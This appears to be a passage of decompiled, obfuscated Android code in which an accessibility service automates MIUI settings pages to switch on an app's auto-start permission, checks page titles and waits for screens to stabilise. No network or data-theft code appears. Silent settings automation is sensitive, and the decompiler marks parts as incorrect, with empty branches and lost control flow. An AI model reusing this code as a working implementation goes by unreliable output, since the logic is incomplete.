                hg0Var = hg0Var2;
                i9 = 4;
                coroutineSingletons = coroutineSingletons3;
                int i202 = i11;
                arrayList = arrayList4;
                c0367a4 = c0367a44;
                i8 = i4;
                i6 = i202;
                int i19222 = i6;
                i4 = i8 + 1;
                i2 = i19222;
                coroutineSingletons3 = coroutineSingletons;
                i3 = i9;
                hg0Var2 = hg0Var;
                str9 = str;
                str10 = str2;
                str11 = str3;
                str12 = str4;
                if (i4 >= i3) {
                }
                MiuiSteps$verifyAndEnableAutoStart$1 miuiSteps$verifyAndEnableAutoStart$16222 = miuiSteps$verifyAndEnableAutoStart$13;
                c0367a43 = c0367a4;
                if (i2 == 0) {
                }
                str5 = str2;
                c0367a43.m212274d8(str5);
                c0367a43.m212274d8("│ │ 🔹 [13.2] 开启「自启动」开关");
                ArrayList arrayListM213298i52222 = AbstractC0715je.m213298i5(hg0Var.getTEXTS_AUTO_START(), u91.f60352a3);
                it = arrayListM213298i52222.iterator();
                miuiSteps$verifyAndEnableAutoStart$12 = miuiSteps$verifyAndEnableAutoStart$16222;
                i10 = 0;
                if (it.hasNext()) {
                }
                break;
            case 6:
                i12 = miuiSteps$verifyAndEnableAutoStart$13.f54489a5;
                str6 = miuiSteps$verifyAndEnableAutoStart$13.f54487a3;
                it2 = (Iterator) miuiSteps$verifyAndEnableAutoStart$13.f54486a2;
                ?? r12 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                c0367a45 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                str = "」";
                str5 = "│ │";
                coroutineSingletons = coroutineSingletons3;
                arrayList5 = r12;
                if (!((Boolean) objM212285f0).booleanValue()) {
                }
                break;
            case 7:
                i12 = miuiSteps$verifyAndEnableAutoStart$13.f54489a5;
                str6 = miuiSteps$verifyAndEnableAutoStart$13.f54487a3;
                it2 = (Iterator) miuiSteps$verifyAndEnableAutoStart$13.f54486a2;
                ?? r122 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                c0367a45 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                coroutineSingletons = coroutineSingletons3;
                str7 = "」";
                str5 = "│ │";
                i13 = 1;
                arrayList6 = r122;
                i10 = i12;
                miuiSteps$verifyAndEnableAutoStart$12 = miuiSteps$verifyAndEnableAutoStart$13;
                it = it2;
                c0367a43 = c0367a45;
                if (((Boolean) objM212285f0).booleanValue()) {
                }
                break;
            case 8:
                list2 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                c0367a46 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                coroutineSingletons = coroutineSingletons3;
                str8 = null;
                i13 = 1;
                miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a46;
                miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = list2;
                miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 9;
                if (b81.m210571b1(300L, miuiSteps$verifyAndEnableAutoStart$13) == coroutineSingletons) {
                }
                c0367a47 = c0367a46;
                miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a47;
                miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = list2;
                miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 10;
                if (c0367a47.m212294f9(2, 100L, 500L, miuiSteps$verifyAndEnableAutoStart$13) == coroutineSingletons) {
                }
                break;
            case 9:
                list2 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                c0367a46 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                coroutineSingletons = coroutineSingletons3;
                str8 = null;
                i13 = 1;
                c0367a47 = c0367a46;
                miuiSteps$verifyAndEnableAutoStart$13.f54484a0 = c0367a47;
                miuiSteps$verifyAndEnableAutoStart$13.f54485a1 = list2;
                miuiSteps$verifyAndEnableAutoStart$13.f54493a9 = 10;
                if (c0367a47.m212294f9(2, 100L, 500L, miuiSteps$verifyAndEnableAutoStart$13) == coroutineSingletons) {
                }
                break;
            case 10:
                list2 = miuiSteps$verifyAndEnableAutoStart$13.f54485a1;
                c0367a48 = miuiSteps$verifyAndEnableAutoStart$13.f54484a0;
                kg1.m213544f4(objM212285f0);
                str8 = null;
                i13 = 1;
                it3 = list2.iterator();
                while (true) {
                    if (it3.hasNext()) {
                    }
                }
                return Boolean.valueOf((boolean) r5);
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: f6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212291f6(List list, long j, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$verifyPageHasText$1 miuiSteps$verifyPageHasText$1;
        C0367a4 c0367a4;
        List list2;
        C0367a4 c0367a42;
        long jCurrentTimeMillis;
        long j2;
        if (continuationImpl instanceof MiuiSteps$verifyPageHasText$1) {
            miuiSteps$verifyPageHasText$1 = (MiuiSteps$verifyPageHasText$1) continuationImpl;
            int i = miuiSteps$verifyPageHasText$1.f54500a6;
            if ((i & Integer.MIN_VALUE) != 0) {
                miuiSteps$verifyPageHasText$1.f54500a6 = i - Integer.MIN_VALUE;
                c0367a4 = this;
            } else {
                c0367a4 = this;
                miuiSteps$verifyPageHasText$1 = new MiuiSteps$verifyPageHasText$1(c0367a4, continuationImpl);
            }
        }
        Object obj = miuiSteps$verifyPageHasText$1.f54498a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = miuiSteps$verifyPageHasText$1.f54500a6;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            list2 = list;
            c0367a42 = c0367a4;
            jCurrentTimeMillis = System.currentTimeMillis();
            j2 = j;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            long j3 = miuiSteps$verifyPageHasText$1.f54497a3;
            long j4 = miuiSteps$verifyPageHasText$1.f54496a2;
            List list3 = miuiSteps$verifyPageHasText$1.f54495a1;
            c0367a42 = miuiSteps$verifyPageHasText$1.f54494a0;
            kg1.m213544f4(obj);
            jCurrentTimeMillis = j3;
            j2 = j4;
            list2 = list3;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
            AccessibilityNodeInfo rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                try {
                    Iterator it = list2.iterator();
                    while (it.hasNext()) {
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it.next());
                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it2.hasNext()) {
                                if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                                    Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                                    while (it3.hasNext()) {
                                        ((AccessibilityNodeInfo) it3.next()).recycle();
                                    }
                                    Boolean bool = Boolean.TRUE;
                                    rootInActiveWindow.recycle();
                                    return bool;
                                }
                            }
                        }
                        if (listFindAccessibilityNodeInfosByText != null) {
                            Iterator<T> it4 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it4.hasNext()) {
                                ((AccessibilityNodeInfo) it4.next()).recycle();
                            }
                        }
                    }
                    rootInActiveWindow.recycle();
                } catch (Throwable th) {
                    rootInActiveWindow.recycle();
                    throw th;
                }
            }
            miuiSteps$verifyPageHasText$1.f54494a0 = c0367a42;
            miuiSteps$verifyPageHasText$1.f54495a1 = list2;
            miuiSteps$verifyPageHasText$1.f54496a2 = j2;
            miuiSteps$verifyPageHasText$1.f54497a3 = jCurrentTimeMillis;
            miuiSteps$verifyPageHasText$1.f54500a6 = 1;
            if (b81.m210571b1(50L, miuiSteps$verifyPageHasText$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        return Boolean.FALSE;
    }

    /* JADX WARN: Code restructure failed: missing block: B:46:0x00f6, code lost:
    
        r12.m212274d8("[标题验证] ✅ 找到标题「" + r14 + "」(尝试" + r0 + ")");
        r0 = r15.iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x011f, code lost:
    
        if (r0.hasNext() == false) goto L86;
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x0121, code lost:
    
        ((android.view.accessibility.AccessibilityNodeInfo) r0.next()).recycle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:50:0x012b, code lost:
    
        r0 = java.lang.Boolean.TRUE;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x012d, code lost:
    
        r11.recycle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:52:0x0130, code lost:
    
        return r0;
     */
    /* JADX WARN: Removed duplicated region for block: B:17:0x0087  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0177  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:67:0x016f -> B:69:0x0172). Please report as a decompilation issue!!! */
    /* renamed from: f7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212292f7(List list, long j, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$verifyPageTitle$1 miuiSteps$verifyPageTitle$1;
        List<String> list2;
        long j2;
        long jCurrentTimeMillis;
        C0367a4 c0367a4;
        int i;
        String string;
        if (continuationImpl instanceof MiuiSteps$verifyPageTitle$1) {
            miuiSteps$verifyPageTitle$1 = (MiuiSteps$verifyPageTitle$1) continuationImpl;
            int i2 = miuiSteps$verifyPageTitle$1.f54508a7;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                miuiSteps$verifyPageTitle$1.f54508a7 = i2 - Integer.MIN_VALUE;
            } else {
                miuiSteps$verifyPageTitle$1 = new MiuiSteps$verifyPageTitle$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$verifyPageTitle$1.f54506a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = miuiSteps$verifyPageTitle$1.f54508a7;
        int i4 = 1;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            m212274d8("[标题验证] ────────────────────────────────────");
            StringBuilder sb = new StringBuilder("[标题验证] 🔍 期望标题: ");
            list2 = list;
            sb.append(list2);
            m212274d8(sb.toString());
            StringBuilder sb2 = new StringBuilder("[标题验证] ⏱️ 超时时间: ");
            j2 = j;
            sb2.append(j2);
            sb2.append("ms");
            m212274d8(sb2.toString());
            jCurrentTimeMillis = System.currentTimeMillis();
            c0367a4 = this;
            i = 0;
            if (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
            }
        } else {
            if (i3 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i5 = miuiSteps$verifyPageTitle$1.f54505a4;
            long j3 = miuiSteps$verifyPageTitle$1.f54504a3;
            long j4 = miuiSteps$verifyPageTitle$1.f54503a2;
            List list3 = miuiSteps$verifyPageTitle$1.f54502a1;
            c0367a4 = miuiSteps$verifyPageTitle$1.f54501a0;
            kg1.m213544f4(obj);
            jCurrentTimeMillis = j3;
            j2 = j4;
            i = i5;
            int i6 = 1;
            list2 = list3;
            i4 = i6;
            if (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
                i += i4;
                AccessibilityNodeInfo rootInActiveWindow = c0367a4.f55106a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    try {
                        loop0: for (String str : list2) {
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                            if (listFindAccessibilityNodeInfosByText != null) {
                                for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                                    if (accessibilityNodeInfo.isVisibleToUser()) {
                                        Rect rect = new Rect();
                                        accessibilityNodeInfo.getBoundsInScreen(rect);
                                        if (rect.top < c0367a4.m212268d2() / 3) {
                                            CharSequence text = accessibilityNodeInfo.getText();
                                            if (text == null || (string = text.toString()) == null) {
                                                string = "";
                                            }
                                            if (AbstractC0779a1.m213652a5(string, str, false) || AbstractC0779a1.m213652a5(str, string, false)) {
                                                break loop0;
                                            }
                                        } else {
                                            continue;
                                        }
                                    }
                                }
                                Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                while (it.hasNext()) {
                                    ((AccessibilityNodeInfo) it.next()).recycle();
                                }
                            }
                        }
                        rootInActiveWindow.recycle();
                    } catch (Throwable th) {
                        rootInActiveWindow.recycle();
                        throw th;
                    }
                }
                miuiSteps$verifyPageTitle$1.f54501a0 = c0367a4;
                miuiSteps$verifyPageTitle$1.f54502a1 = list2;
                miuiSteps$verifyPageTitle$1.f54503a2 = j2;
                miuiSteps$verifyPageTitle$1.f54504a3 = jCurrentTimeMillis;
                miuiSteps$verifyPageTitle$1.f54505a4 = i;
                i6 = 1;
                miuiSteps$verifyPageTitle$1.f54508a7 = 1;
                if (b81.m210571b1(50L, miuiSteps$verifyPageTitle$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                i4 = i6;
                if (System.currentTimeMillis() - jCurrentTimeMillis < j2) {
                    c0367a4.m212274d8("[标题验证] ❌ 超时(" + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms)，未找到期望标题");
                    return Boolean.FALSE;
                }
            }
        }
    }

    /* renamed from: f8 */
    public final Object m212293f8(InterfaceC0876mv interfaceC0876mv) throws Throwable {
        m212274d8("[等待] level=1, wait=300ms");
        Object objM212272d6 = m212272d6(300L, (ContinuationImpl) interfaceC0876mv);
        return objM212272d6 == CoroutineSingletons.f57606a0 ? objM212272d6 : C1351vv.f60710b1;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: f9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212294f9(int i, long j, long j2, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$waitForPageStable$1 miuiSteps$waitForPageStable$1;
        C0367a4 c0367a4;
        long j3;
        MiuiSteps$waitForPageStable$1 miuiSteps$waitForPageStable$12;
        C0367a4 c0367a42;
        long jCurrentTimeMillis;
        int i2;
        long j4;
        int i3;
        int i4;
        if (continuationImpl instanceof MiuiSteps$waitForPageStable$1) {
            miuiSteps$waitForPageStable$1 = (MiuiSteps$waitForPageStable$1) continuationImpl;
            int i5 = miuiSteps$waitForPageStable$1.f54518a9;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                miuiSteps$waitForPageStable$1.f54518a9 = i5 - Integer.MIN_VALUE;
                c0367a4 = this;
            } else {
                c0367a4 = this;
                miuiSteps$waitForPageStable$1 = new MiuiSteps$waitForPageStable$1(c0367a4, continuationImpl);
            }
        }
        Object obj = miuiSteps$waitForPageStable$1.f54516a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = miuiSteps$waitForPageStable$1.f54518a9;
        if (i6 == 0) {
            kg1.m213544f4(obj);
            j3 = j2;
            miuiSteps$waitForPageStable$12 = miuiSteps$waitForPageStable$1;
            c0367a42 = c0367a4;
            jCurrentTimeMillis = System.currentTimeMillis();
            i2 = 0;
            j4 = j;
            i3 = -1;
            i4 = i;
        } else {
            if (i6 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i7 = miuiSteps$waitForPageStable$1.f54512a3;
            int i8 = miuiSteps$waitForPageStable$1.f54511a2;
            long j5 = miuiSteps$waitForPageStable$1.f54515a6;
            long j6 = miuiSteps$waitForPageStable$1.f54514a5;
            long j7 = miuiSteps$waitForPageStable$1.f54513a4;
            int i9 = miuiSteps$waitForPageStable$1.f54510a1;
            c0367a42 = miuiSteps$waitForPageStable$1.f54509a0;
            kg1.m213544f4(obj);
            i4 = i9;
            miuiSteps$waitForPageStable$12 = miuiSteps$waitForPageStable$1;
            i3 = i8;
            i2 = i7;
            jCurrentTimeMillis = j5;
            j3 = j6;
            j4 = j7;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j3) {
            AccessibilityNodeInfo rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
            int iM212239a7 = rootInActiveWindow != null ? m212239a7(rootInActiveWindow) : 0;
            if (rootInActiveWindow != null) {
                rootInActiveWindow.recycle();
            }
            if (iM212239a7 != i3 || iM212239a7 <= 0) {
                i3 = iM212239a7;
                i2 = 0;
            } else {
                i2++;
                if (i2 >= i4) {
                    c0367a42.m212274d8(AbstractC0003a2.m31b2("[等待] ✅ 页面稳定 (节点数:", iM212239a7, ", 连续", i2, "次一致)"));
                    return Boolean.TRUE;
                }
            }
            miuiSteps$waitForPageStable$12.f54509a0 = c0367a42;
            miuiSteps$waitForPageStable$12.f54510a1 = i4;
            miuiSteps$waitForPageStable$12.f54513a4 = j4;
            miuiSteps$waitForPageStable$12.f54514a5 = j3;
            miuiSteps$waitForPageStable$12.f54515a6 = jCurrentTimeMillis;
            miuiSteps$waitForPageStable$12.f54511a2 = i3;
            miuiSteps$waitForPageStable$12.f54512a3 = i2;
            miuiSteps$waitForPageStable$12.f54518a9 = 1;
            if (c0367a42.m212272d6(j4, miuiSteps$waitForPageStable$12) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        return Boolean.FALSE;
    }
}
